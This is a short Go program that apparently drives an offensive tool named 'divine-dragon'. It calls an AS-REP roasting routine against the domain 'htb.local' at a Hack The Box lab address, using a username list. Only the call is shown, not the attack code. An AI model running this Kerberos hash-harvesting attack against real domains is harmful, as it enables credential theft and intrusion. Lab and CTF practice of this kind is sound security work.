package main

import (
	"divine-dragon/remote_exploit"
)

func main() {
	remote_exploit.ASREPRoasting("htb.local", "10.129.95.210", false, false, false, "test", "remote_exploit/names.txt")
}
